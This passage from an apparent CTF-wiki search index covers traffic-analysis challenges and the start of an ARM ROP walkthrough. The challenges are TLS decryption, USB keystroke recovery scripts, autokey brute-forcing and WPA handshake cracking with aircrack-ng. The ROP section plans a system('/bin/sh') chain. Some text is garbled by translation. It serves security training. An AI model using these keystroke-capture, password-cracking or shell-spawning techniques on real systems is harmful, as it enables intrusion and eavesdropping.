(SSL). The protocol is therefore also referred to as HTTP over TLS, or HTTP over SSL.</p>"},{"location":"misc/traffic/protocols/HTTPS/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/protocols/HTTPS/#hack-dat-kiwi-ctf-2015-ssl-sniff-2","title":"hack-dat-kiwi-ctf-2015: ssl-sniff-2","text":"<p>Download the challenge files here</p> <p>Open the PCAP file in Wireshark, you will find <code>TLS</code> encrypted data.</p> <p>We are given the <code>server.key.insecure</code> key, so we need to import that key in order to decrypt the packets.</p> <p>There are two ways to get to the <code>TLS</code> Preferences page:</p> <ol> <li> <p><code>Edit --&gt; Preferences --&gt; Protocols --&gt; TLS</code></p> </li> <li> <p><code>Right click on a TSL packet --&gt; Transport Layer Security --&gt; Open Transport Layer Security preferences</code></p> </li> </ol> <p>After you get to the <code>TLS</code> Preferences page, click on <code>Edit...</code> next to the RSA keys list.</p> <p>Then, add the <code>server.key.insecure</code> file to <code>Key File</code> and hit <code>OK</code>.</p> <p></p> <p>Now, you can see the decrypted packets. You will find the flag in the HTTP packets.</p> <p></p>"},{"location":"misc/traffic/protocols/USB/","title":"USB","text":""},{"location":"misc/traffic/protocols/USB/#usb","title":"USB","text":"<p>USB Details</p>"},{"location":"misc/traffic/protocols/USB/#mouse","title":"Mouse","text":"<p>The data length of a mouse packet is 4 bytes. The first byte represents buttons pressed. <code>0x00</code> is no buttons pressed, <code>0x01</code> indicates left button pressed, and <code>0x02</code> indicates right button pressed. The second byte is a signed byte, where the highest bit is the sign bit. When positive, it represents how many pixels the mouse has moved horizontally to the right. When negative, it shows how many pixels it has moved horizontally to the left. The third byte, like the second byte, represents an offset that moves vertically up and down.</p> <p></p> <p>By extracting those bytes in the USB mouse packets, you can recover the mouse movement.</p>"},{"location":"misc/traffic/protocols/USB/#keyboard","title":"Keyboard","text":"<p>The data length of a keyboard packet is 8 bytes.</p> <p>The keystroke is at the 3<sup>rd</sup> byte.</p> <p></p> <p>Each value corresponds to different keys.</p> <p></p> <p>The full keyboard keymap can be found here on page 53 to 59.</p> <p>By extracting 3<sup>rd</sup> bytes within the keyboard packets, you can recover all the keystrokes pressed.</p>"},{"location":"misc/traffic/protocols/USB/#usb-traffic-packet-capture","title":"USB Traffic Packet Capture","text":"<p>Before we get started, let's introduce some of the basics of <code>USB</code>.</p> <p><code>USB</code> has different specifications, the following are three different types of <code>USB</code>:</p> <pre><code>l USB UART\nl USB HID\nl USB Memory\n</code></pre> <p><code>UART</code> or <code>Universal Asynchronous Receiver/Transmitter</code> is a simple device that uses <code>USB</code> to receive and transmit data.</p> <p><code>HID</code> stands for human interface. This type is suitable for interactive applications such as keyboards, mice, gamepads, and digital display devices.</p> <p>The last is <code>USB Memory</code>, or data storage. <code>External HDD</code>, <code>thumb drive/flash drive</code>, etc. are all of this type.</p> <p>The most widely used <code>USB</code> type is <code>USB Memory</code>.</p> <p>Each <code>USB</code> device (especially <code>HID</code> or <code>Memory</code>) has a vendor <code>ID (Vendor ID)</code> and a product identifier (Product Id). <code>Vendor ID</code> is used to mark which manufacturer made this <code>USB</code> device. <code>Product ID</code> is used for different types of products.</p> <p>An example:</p> <p></p> <p>The above picture is a list of <code>USB</code> devices connected to my computer in a virtual machine.</p> <p>In this example, I have a wireless mouse under <code>VMware</code>, which is a <code>HID</code> device. This device is running normally. You can see all the <code>USB</code> devices connected with the <code>lsusb</code> command.</p> <p>Now, you can find out which one is this mouse?</p> <p>Correct! It is the fourth one:</p> <pre><code>Bus 002 Device 002: ID 0e0f:0003 VMware, Inc. Virtual Mouse\n</code></pre> <p><code>ID 0e0f:0003</code> is the <code>Vendor-Product ID</code> pair, where the value of <code>Vendor ID</code> is <code>0e0f</code> and the value of <code>Product ID</code> is <code>0003</code>.</p> <p><code>Bus 002 Device 002</code> means the <code>usb</code> device is connected. This should be noted.</p> <p>We ran <code>Wireshark</code> with <code>root</code> permission to capture the <code>USB</code> data stream. However, we don't recommend it.</p> <p>We need to give the user enough permissions to get the <code>usb</code> data stream in <code>Linux</code>. We can use <code>udev</code> to achieve our goal. We need to create a user group <code>usbmon</code> and add our account to this group.</p> <pre><code>addgroup usbmon\ngpasswd -a $USER usbmon\necho 'SUBSYSTEM==\"usbmon\", GROUP=\"usbmon\", MODE=\"640\"' &gt; /etc/udev/rules.d/99-usbmon.rules\n</code></pre> <p>Next, we need the <code>usbmon</code> kernel module. If the module is not loaded, we can load the module with the following command:</p> <pre><code>modprobe usbmon\n</code></pre> <p>Open <code>wireshark</code> and you will see <code>usbmonX</code> where <code>X</code> represents the number.</p> <p>It should look like this (note we are running it as <code>root</code>):</p> <p></p> <p>If the interface is active or there is data flow, <code>wireshark</code>  will display it as a wave next to that interface.</p> <p>So, which one should we choose?</p> <p>Correct!, <code>usbmon0</code>. Open that and you can observe the <code>usb</code> packets.</p> <p></p> <p>Through capturing the <code>usb</code> packets, we can learn the communication and working principles used between the USB device and the host. Furthermore, we can analyze the <code>usb</code> packets.</p>"},{"location":"misc/traffic/protocols/USB/#ctf-examples","title":"CTF Examples","text":""},{"location":"misc/traffic/protocols/USB/#usbkeyboarddatahacker","title":"UsbKeyboardDataHacker","text":"<p>Based on the previous sections, we have a rough understanding of the <code>USB</code> traffic packet capture.</p> <p>Let's talk about how to analyze a <code>USB</code> traffic packet capture.</p> <p>For details on the <code>USB</code> protocol, see the Wireshark wiki</p> <p>Download the PCAP file here.</p> <p>Let's start with a simple example on <code>GitHub</code>:</p> <p></p> <p>We can know that the data part of the <code>USB</code> protocol is in the <code>Leftover Capture Data</code> field.</p> <p>Mac and Linux</p> <p>You can use the <code>tshark</code> command to extract the <code>Leftover Capture Data</code> field.</p> <p>The command is as follows:</p> <pre><code>tshark -r example.pcap -T fields -e usb.capdata &gt; usbdata.txt\n</code></pre> <p>Windows</p> <p>There is a <code>tshark.exe</code> in the <code>wireshark</code> directory. For example, on my machine it's at <code>D:\\Program Files\\Wireshark\\tshark.exe</code>.</p> <p></p> <p>Run <code>cmd</code> and navigate to the current directory.</p> <p>The command is as follows:</p> <pre><code>tshark.exe -r example.pcap -T fields -e usb.capdata &gt; usbdata.txt\n</code></pre> <p>For detailed usage of the <code>tshark</code> command, see the Wireshark official documentation</p> <p>Run the command and open at <code>usbdata.txt</code>. You will see the size of the data is 8 bytes.</p> <p></p> <p>The data length of the keyboard packet is <code>8</code> bytes, the keystroke information is at the 3<sup>rd</sup> byte. Each time the <code>key stroke</code> will generate a <code>keyboard event usb packet</code>.</p> <p>The data length of the mouse data packet is <code>4</code> bytes. The first byte represents the button. When the value is <code>0x00</code>, it means there is no button. When it is 0x01, it means the left button. When it is <code>0x02</code>, it means the right button. The second byte can be thought as a <code>signed byte</code> type, with the most significant bit as the sign bit. When this value is positive, it represents how many pixels the mouse is horizontally shifted to the right. When it is negative, it represents how many pixels are horizontally shifted to the left. The third byte is similar to the second byte and represents the offset of the vertical up and down movement.</p> <p>We can find the meaning of each value here. With this information, we can make a key map.</p> <p>Here is a table of keymap for keyboard strokes, which can be found from the link above.</p> <p></p> <p>We write the following script:</p> <pre><code>mappings = { 0x04:\"A\",  0x05:\"B\",  0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\",  0x0B:\"H\", 0x0C:\"I\",  0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\",  0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\",  0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"n\", 0x2a:\"[DEL]\",  0X2B:\"    \", 0x2C:\" \",  0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\",  0x30:\"]\",  0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\",  0x34:\"'\", 0x36:\",\",  0x37:\".\" }\n\nnums = []\n\nkeys = open('usbdata.txt')\n# tshark -r example.pcap -T fields -e usb.capdata &gt; usbdata.txt\n\nfor line in keys:\n\n    if line[:2] != '00' or line[4:6] != '00':\n        nums.append(int(line[4:6],16))\n    # 00:00:xx:....\n\nkeys.close()\n\noutput = \"\"\n\nfor n in nums:\n    if n == 0:\n        continue\n    if n in mappings:\n        output += mappings[n]\n    else:\n        output += '[unknown]'\n\nprint('output:' + output)\n</code></pre> <p>The results are as follows:</p> <p></p> <p>Here is the full solve script:</p> <pre><code>#!/usr/bin/env python\n\nimport sys\nimport os\n\nDataFileName = \"usb.dat\"\n\npresses = []\n\nnormalKeys = {\"04\":\"a\", \"05\":\"b\", \"06\":\"c\", \"07\":\"d\", \"08\":\"e\", \"09\":\"f\", \"0a\":\"g\", \"0b\":\"h\", \"0c\":\"i\", \"0d\":\"j\", \"0e\":\"k\", \"0f\":\"l\", \"10\":\"m\", \"11\":\"n\", \"12\":\"o\", \"13\":\"p\", \"14\":\"q\", \"15\":\"r\", \"16\":\"s\", \"17\":\"t\", \"18\":\"u\", \"19\":\"v\", \"1a\":\"w\", \"1b\":\"x\", \"1c\":\"y\", \"1d\":\"z\",\"1e\":\"1\", \"1f\":\"2\", \"20\":\"3\", \"21\":\"4\", \"22\":\"5\", \"23\":\"6\",\"24\":\"7\",\"25\":\"8\",\"26\":\"9\",\"27\":\"0\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"-\",\"2e\":\"=\",\"2f\":\"[\",\"30\":\"]\",\"31\":\"\\\\\",\"32\":\"&lt;NON&gt;\",\"33\":\";\",\"34\":\"'\",\"35\":\"&lt;GA&gt;\",\"36\":\",\",\"37\":\".\",\"38\":\"/\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\nshiftKeys = {\"04\":\"A\", \"05\":\"B\", \"06\":\"C\", \"07\":\"D\", \"08\":\"E\", \"09\":\"F\", \"0a\":\"G\", \"0b\":\"H\", \"0c\":\"I\", \"0d\":\"J\", \"0e\":\"K\", \"0f\":\"L\", \"10\":\"M\", \"11\":\"N\", \"12\":\"O\", \"13\":\"P\", \"14\":\"Q\", \"15\":\"R\", \"16\":\"S\", \"17\":\"T\", \"18\":\"U\", \"19\":\"V\", \"1a\":\"W\", \"1b\":\"X\", \"1c\":\"Y\", \"1d\":\"Z\",\"1e\":\"!\", \"1f\":\"@\", \"20\":\"#\", \"21\":\"$\", \"22\":\"%\", \"23\":\"^\",\"24\":\"&amp;\",\"25\":\"*\",\"26\":\"(\",\"27\":\")\",\"28\":\"&lt;RET&gt;\",\"29\":\"&lt;ESC&gt;\",\"2a\":\"&lt;DEL&gt;\", \"2b\":\"\\t\",\"2c\":\"&lt;SPACE&gt;\",\"2d\":\"_\",\"2e\":\"+\",\"2f\":\"{\",\"30\":\"}\",\"31\":\"|\",\"32\":\"&lt;NON&gt;\",\"33\":\"\\\"\",\"34\":\":\",\"35\":\"&lt;GA&gt;\",\"36\":\"&lt;\",\"37\":\"&gt;\",\"38\":\"?\",\"39\":\"&lt;CAP&gt;\",\"3a\":\"&lt;F1&gt;\",\"3b\":\"&lt;F2&gt;\", \"3c\":\"&lt;F3&gt;\",\"3d\":\"&lt;F4&gt;\",\"3e\":\"&lt;F5&gt;\",\"3f\":\"&lt;F6&gt;\",\"40\":\"&lt;F7&gt;\",\"41\":\"&lt;F8&gt;\",\"42\":\"&lt;F9&gt;\",\"43\":\"&lt;F10&gt;\",\"44\":\"&lt;F11&gt;\",\"45\":\"&lt;F12&gt;\"}\n\ndef main():\n    # check argv\n    if len(sys.argv) != 2:\n        print(\"Usage : \")\n        print(\"        python UsbKeyboardHacker.py data.pcap\")\n        print(\"Tips : \")\n        print(\"        To use this python script , you must install the tshark first.\")\n        print(\"        You can use `sudo apt-get install tshark` to install it\")\n        print(\"Author : \")\n        print(\"        WangYihang &lt;wangyihanger@gmail.com&gt;\")\n        print(\"        If you have any questions , please contact me by email.\")\n        print(\"        Thank you for using.\")\n        exit(1)\n\n    # get argv\n    pcapFilePath = sys.argv[1]\n\n    # get data of pcap\n    os.system(\"tshark -r %s -T fields -e usb.capdata 'usb.data_len == 8' &gt; %s\" % (pcapFilePath, DataFileName))\n\n    # read data\n    with open(DataFileName, \"r\") as f:\n        for line in f:\n            presses.append(line[0:-1])\n    # handle\n    result = \"\"\n    for press in presses:\n        if press == '':\n            continue\n        if ':' in press:\n            Bytes = press.split(\":\")\n        else:\n            Bytes = [press[i:i+2] for i in range(0, len(press), 2)]\n        if Bytes[0] == \"00\":\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += normalKeys[Bytes[2]]\n        elif int(Bytes[0],16) &amp; 0b10 or int(Bytes[0],16) &amp; 0b100000: # shift key is pressed.\n            if Bytes[2] != \"00\" and normalKeys.get(Bytes[2]):\n                result += shiftKeys[Bytes[2]]\n        else:\n            print(\"[-] Unknow Key : %s\" % (Bytes[0]))\n    print(\"[+] Found : %s\" % (result))\n\n    # clean the temp data\n    os.system(\"rm ./%s\" % (DataFileName))\n\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>We write the following script:</p> <p></p>"},{"location":"misc/traffic/protocols/USB/#xman-autokey","title":"XMan - AutoKey","text":"<p>Download the PCAP file here</p> <p></p> <p>Run the script from earlier: <code>python UsbKeyboardDataHacker.py task_AutoKey.pcapng</code></p> <p>Then we got this output: <pre><code>[+] Found : &lt;CAP&gt;a&lt;CAP&gt;utokey('****').decipheer('&lt;CAP&gt;mplrvffczeyoujfjkybxgzvdgqaurkxzolkolvtufblrnjesqitwahxnsijxpnmplshcjbtyhzealogviaaissplfhlfswfehjncrwhtinsmambvexo&lt;DEL&gt;pze&lt;DEL&gt;iz')\n</code></pre></p> <p>We can see that this is a autokey cipher, but how do we decode it without the key?</p> <p>I found this script, which brute force the key.</p> <p>The brute force script:</p> <p>Note</p> <p>Run this script in Python2</p> <pre><code>from ngram_score import ngram_score\nfrom pycipher import Autokey\nimport re\nfrom itertools import permutations\n\nqgram = ngram_score('quadgrams.txt')\ntrigram = ngram_score('trigrams.txt')\nctext = 'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ'\nctext = re.sub(r'[^A-Z]','',ctext.upper())\n\n# keep a list of the N best things we have seen, discard anything else\nclass nbest(object):\n    def __init__(self,N=1000):\n        self.store = []\n        self.N = N\n\n    def add(self,item):\n        self.store.append(item)\n        self.store.sort(reverse=True)\n        self.store = self.store[:self.N]\n\n    def __getitem__(self,k):\n        return self.store[k]\n\n    def __len__(self):\n        return len(self.store)\n#init\nN=100\nfor KLEN in range(3,20):\n    rec = nbest(N)\n\n    for i in permutations('ABCDEFGHIJKLMNOPQRSTUVWXYZ',3):\n        key = ''.join(i) + 'A'*(KLEN-len(i))\n        pt = Autokey(key).decipher(ctext)\n        score = 0\n        for j in range(0,len(ctext),KLEN):\n            score += trigram.score(pt[j:j+3])\n        rec.add((score,''.join(i),pt[:30]))\n\n    next_rec = nbest(N)\n    for i in range(0,KLEN-3):\n        for k in xrange(N):\n            for c in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':\n                key = rec[k][1] + c\n                fullkey = key + 'A'*(KLEN-len(key))\n                pt = Autokey(fullkey).decipher(ctext)\n                score = 0\n                for j in range(0,len(ctext),KLEN):\n                    score += qgram.score(pt[j:j+len(key)])\n                next_rec.add((score,key,pt[:30]))\n        rec = next_rec\n        next_rec = nbest(N)\n    bestkey = rec[0][1]\n    pt = Autokey(bestkey).decipher(ctext)\n    bestscore = qgram.score(pt)\n    for i in range(N):\n        pt = Autokey(rec[i][1]).decipher(ctext)\n        score = qgram.score(pt)\n        if score &gt; bestscore:\n            bestkey = rec[i][1]\n            bestscore = score       \n    print bestscore,'autokey, klen',KLEN,':\"'+bestkey+'\",',Autokey(bestkey).decipher(ctext)\n</code></pre> <p>The results of running out are as follows:</p> <p></p> <p>We saw the word <code>flag</code> in one of the results:</p> <pre><code>(-674.9145695645551, 'autokey, klen', 8, ':\"FLAGHERE\",', 'HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF')\n</code></pre> <p>After splitting words, we see :</p> <pre><code>HELLO\nBOYS\nAND\nGIRLS\nYOU\nARE\nSO\nSMART\nTHAT\nYOU\nCAN\nFIND\nTHE\nFLAG\nTHAT\nTHEM\nHERE\nIN\nTHE\nKEY\nBOARD\nPACKAGE\nFLAG\nIS\nJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF\n</code></pre> <p>The last line contains the flag: <code>flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}</code></p>"},{"location":"misc/traffic/protocols/USB/#related-ctf-challenges","title":"Related CTF Challenges","text":"<ul> <li>UsbMiceDataHacker</li> </ul>"},{"location":"misc/traffic/protocols/USB/#references","title":"References","text":"<ul> <li> <p>https://github.com/WangYihang/UsbMiceDataHacker</p> </li> <li> <p>https://github.com/WangYihang/UsbKeyboardDataHacker</p> </li> <li> <p>https://www.anquanke.com/post/id/85218</p> </li> <li> <p>https://www.cnblogs.com/ECJTUACM-873284962/p/9473808.html</p> </li> <li> <p>https://blog.csdn.net/songze_lee/article/details/77658094</p> </li> <li> <p>https://wiki.wireshark.org/USB</p> </li> <li> <p>http://www.usb.org/developers/hidpage/Hut1_12v2.pdf</p> </li> <li> <p>https://www.wireshark.org/docs/man-pages/tshark.html</p> </li> <li> <p>http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</p> </li> <li> <p>https://hackfun.org/2017/02/22/CTF%E4%B8%AD%E9%82%A3%E4%BA%9B%E8%84%91%E6%B4%9E%E5%A4%A7%E5%BC%80%E7%9A%84%E7%BC%96%E7%A0%81%E5%92%8C%E5%8A%A0%E5%AF%86/</p> </li> </ul>"},{"location":"misc/traffic/protocols/WIFI/","title":"WIFI","text":""},{"location":"misc/traffic/protocols/WIFI/#wifi","title":"WIFI","text":"<p><code>802.11</code> is a common standard for wireless LANs today.</p> <p>Common authentication methods:</p> <ul> <li>None</li> <li><code>WEP\u200d\u200d</code></li> <li><code>WPA/WPA2-PSK</code> (pre-shared key)\u200d\u200d</li> <li><code>WPA2 802.1X</code> (<code>radius</code> certificate)</li> </ul>"},{"location":"misc/traffic/protocols/WIFI/#wpa-psk","title":"WPA-PSK","text":"<p>The general process of authentication is shown:</p> <p></p> <p>Four handshakes:</p> <p></p> <ol> <li>4 Ways handshake starts at the AP, it then generates a random string (ANonce) and sends it to the requester.</li> <li>The requester also generates its own random SNonce, and then uses these two Nonces and PMK to generate the PTK. The requester replies message 2 to the authenticator and a MIC (message integrity code) as the verification of the PMK.</li> <li>The authenticator sends information from the requester\u2019s message 2 back to the requester, once it\u2019s verified, it will generate GTK if needed. Then, sends it as message 3.</li> <li>The requester receives message 3, verifies the MIC, installs the key, sends a message 4, and a confirmation message. The verifier receives message 4, verifies the MIC, installs the same key.</li> </ol>"},{"location":"misc/traffic/protocols/WIFI/#ctf-example","title":"CTF Example","text":""},{"location":"misc/traffic/protocols/WIFI/#experiment-lab-shipin","title":"Experiment Lab - shipin","text":"<p>Download the PCAP file here</p> <p>From a large number of <code>Deauth</code> packets, we obtained the handshake packets in the traffics, which we can use to crack the WIFI password.</p> <p></p> <p>Next, we crack the password.</p> <p>You can use the <code>aircrack</code> suite.</p> <p>Run the command <code>aircrack-ng shipin.cap -w /usr/share/wordlists/rockyou.txt</code></p> <p>We found the key, <code>88888888</code>.</p> <p>Now, we can use the key found to decrypt the packets within the WIFI network.</p> <p>Go to <code>Edit --&gt; Preferences --&gt; Protocols --&gt; IEEE802.11 --&gt; Edit</code> in Wireshark.</p> <p>Fill in the form <code>key-type:key</code> to decrypt the packets to see the clear text traffic.</p> <p></p> <p>There is no flag in this challenge.</p>"},{"location":"misc/traffic/protocols/WIFI/#references","title":"References","text":"<ul> <li> <p>http://www.freebuf.com/articles/wireless/58342.html</p> </li> <li> <p>http://blog.csdn.net/keekjkj/article/details/46753883</p> </li> </ul>"},{"location":"misc/traffic/protocols/Wireshark/","title":"Wireshark","text":""},{"location":"misc/traffic/protocols/Wireshark/#wireshark-common-features","title":"Wireshark Common Features","text":""},{"location":"misc/traffic/protocols/Wireshark/#display-filter","title":"Display Filter","text":"<p>Display filters can use several different parameters as matching criteria, such as IP address, protocol, port number, and some protocol header\u2019s parameters. In addition, users use some conditionals and concatenation operators to create more complex expressions. Users can combine different expressions to filter out a precise range of packets. All packets displayed can be filtered by bytes within the packets.</p> <p>A display filter follows this structure:</p> <pre><code>[not] Expression [and|or] [not] Expression\n</code></pre> <p>Often used operators:</p> Operator Description == Equal != Not Equal &gt; Greater Than &lt; Less Than &gt;= Greater Than or Equal To &lt;= Less Than or Equal To &amp;&amp; AND || OR ! NOT"},{"location":"misc/traffic/protocols/Wireshark/#filter-methods","title":"Filter Methods","text":"<p>There are many ways to do display filter:</p> <ul> <li> <p>Display filter expression</p> <p><code>Analyze --&gt; Display Filter Expression</code></p> </li> </ul> <p></p> <ul> <li>Display filter toolbar</li> </ul> <p></p> <ul> <li>Right-clicking on a specific filed and Apply Selected As Filter</li> </ul> <p></p> <p>Note</p> <p>You can obtain the complex filtering expression with this method.</p>"},{"location":"misc/traffic/protocols/Wireshark/#statistics-information","title":"Statistics Information","text":""},{"location":"misc/traffic/protocols/Wireshark/#protocol-hierarchy","title":"Protocol Hierarchy","text":"<p><code>Statistics --&gt; Protocol Hierarchy</code></p> <p>A hierarchy of all the protocols contained in the file.</p> <p></p>"},{"location":"misc/traffic/protocols/Wireshark/#conversations","title":"Conversations","text":"<p><code>Statistics --&gt; Conversations</code></p> <p>All traffic occurring between IP addresses of a particular endpoint.</p> <p></p> <p>Note</p> <ul> <li> <p>Check the IP address that sent or received many data streams. If you know that server, then the problem is solved. However, it\u2019s possible that is it just some device scanning the network or generating a large amount of data.</p> </li> <li> <p>Check for scan patterns. If a device made one scan, then that\u2019s likely normal. For example, SNMP software sent a ping message to find the network. However, if there are many scans, then something fishy is happening.</p> </li> </ul>"},{"location":"misc/traffic/protocols/Wireshark/#endpoints","title":"Endpoints","text":"<p><code>Statistics --&gt; Endpoints</code></p> <p>List all endpoints found by Wireshark.</p> <p></p>"},{"location":"misc/traffic/protocols/Wireshark/#http-packet-counter","title":"HTTP - Packet Counter","text":"<p><code>Statistics --&gt; HTTP --&gt; Packet Counter</code></p> <p>Count HTTP packets.</p> <p></p>"},{"location":"pwn/readme/","title":"Readme","text":"<p>Outline some directions of pwn, as well as ideas.</p>"},{"location":"pwn/readme/#glibc-pwn","title":"GLIBC Pwn","text":"<p>Usually related to memory management under linux. As we often say the house of series content</p>"},{"location":"pwn/readme/#browser-pwn","title":"Browser Pwn","text":"<p>Browser-related Pwn</p> <p>https://github.com/Escapingbug/awesome-browser-exploit</p>"},{"location":"pwn/readme/#kernel-pwn","title":"Kernel Pwn","text":""},{"location":"pwn/readme/#windows-kernel","title":"Windows Kernel","text":""},{"location":"pwn/readme/#linux-kernel","title":"Linux Kernel","text":"<p>The Linux kernel vulnerabilities, in the case of CTFs, are mostly LKM vulnerabilities. These vulnerabilities are used to achieve privilege and secure shells.</p>"},{"location":"pwn/readme/#all","title":"ALL","text":"<ul> <li> <p>Need a new document section for english.</p> </li> <li> <p>Look into reccursivly translating into english through google.</p> </li> <li> <p>Get a public work to clean up grammar. </p> </li> </ul>"},{"location":"pwn/linux/arm/arm_rop/","title":"arm - ROP","text":""},{"location":"pwn/linux/arm/arm_rop/#introduction","title":"Introduction","text":"<p>Because the pwn of architectures such as arm and mips is still a simple stack vulnerability, so I only intend to introduce the rop under arm. The use of other vulnerabilities will be introduced gradually.</p>"},{"location":"pwn/linux/arm/arm_rop/#prerequisite-knowledge","title":"Prerequisite knowledge","text":"<p>First look at the function calling convention under arm. The first to fourth parameters of the function are stored in the r0 to r3 registers, and the remaining parameters are pushed into the stack from right to left. The caller implements stack balancing. The return value of the function is stored in r0</p> <p></p> <p>In addition, arm b/bl and other instructions implement jumps; pc register is equivalent to x86 eip, save the address of the next instruction, is also the target we want to control</p>"},{"location":"pwn/linux/arm/arm_rop/#jarvisoj-typo","title":"jarvisoj - typo","text":"<p>Here is an example of jarvisoj's typo, which can be downloaded at [ctf-challenge] (https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo)</p>"},{"location":"pwn/linux/arm/arm_rop/#determining-protection","title":"Determining protection","text":"<pre><code>jarvisOJ_typo [master\u25cf\u25cf] check ./typo\n\ntypo: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, for GNU/Linux 2.6.32, BuildID[sha1]=211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped\n\n[*] &amp;#39;/ home / m4x / pwn_repo / jarvisOJ_typo / typo&amp;#39;\n    Arch:     arm-32-little\n\n    RELRO:    Partial RELRO\n\n    Stack:    No canary found\n\n    NX:       NX enabled\n\nFOOT: No FOOT (0x8000)\n</code></pre> <p>Statically linked programs, no open stack overflow protection and PIE; static link instructions, we can find dangerous functions such as system and \"/bin/sh\" sensitive strings in binary, because it is No PIE, so we only need stack overflow to construct ropchain to get shell</p>"},{"location":"pwn/linux/arm/arm_rop/#using-ideas","title":"Using ideas","text":"<p>So we need to find an overflow point, run the program first, because it is statically linked, so you can run it directly when the environment is configured well. <pre><code>jarvisOJ_typo [master \u25cf\u25cf] ./typo\nLet's Do Some Typing Exercise~\n\nPress Enter to get start;\n\nInput ~ if you want to quit\n\n\n\n------Begin------\n\nthrong\n\nthrong\n\n\n\nsurvive\n\naaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\nqemu: uncaught target signal 11 (Segmentation fault) - core dumped\n\n[1]    1172 segmentation fault  ./typo\n</code></pre></p> <p>There are not many input points in the program, it is easy to find the overflow point.</p>"},{"location":"pwn/linux/arm/arm_rop/#constructing-rop","title":"Constructing ROP","text":"<p>So the idea is very obvious, using the stack overflow construct system(\"/bin/sh\"), first find the gadgets <pre><code>jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --only \"pop\"   \n\nGadgets information\n\n============================================================\n\n0x00020904 : pop {r0, r4, pc}\n\n0x00068bec : pop {r1, pc}\n\n0x00008160 : pop {r3, pc}\n\n0x0000ab0c : pop {r3, r4, r5, pc}\n\n0x0000a958 : pop {r3, r4, r5, r6, r7, pc}\n\n0x00014a70 : pop {r3, r4, r7, pc}\n\n0x000083b0 : pop {r4, pc}\n\n0x00009284 : pop {r4, r5, pc}\n\n0x000095b8 : pop {r4, r5, r6, pc}\n\n0x000082e8 : pop {r4, r5, r6, r7, pc}\n\n0x00023ed4 : pop {r4, r5, r7, pc}\n\n0x00023dbc : pop {r4, r7, pc}\n\n0x00014068 : pop {r7, pc}\n\n\n\nUnique gadgets found: 13\n</code></pre></p> <p>We only need to control the first parameter, so we can choose <code>pop {r0, r4, pc}</code> this gadgets to construct the following stack structure. <pre><code>+-------------+\n\n|             |\n\n|  padding    |\n\n+-------------+\n\n|  padding    | &lt;- frame pointer\n\n+-------------+ \n\n|gadgets_addr | &lt;- return address\n\n+-------------+\n\n|binsh_addr   |\n\n+-------------+\n\n|junk_data    |\n\n+-------------+\n\n|system_addr  |\n\n+-------------+\n</code></pre></p> <p>At this time, you need the length of padding and the address of system and /bin/sh. The address of /bin/sh can be found with ROPgadget. <pre><code>jarvisOJ_typo [master\u25cf\u25cf] ROPgadget --binary ./typo --string /bin/sh\n\nStrings information\n\n============================================================\n\n0x0006cb70 : /bin/sh\n</code></pre></p> <p>The length of padding can be easily found using pwntools' cyclic <pre><code>pwndbg&gt; cyclic 200\n\naaaabaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababa\npwndbg&gt; c\n\nContinuing.\n\n\n\nProgram received signal SIGSEGV, Segmentation fault.\n\n0x62616164 in ?? ()\n\nLEGEND: STACK | HEAP | CODE | DATA | RWX | 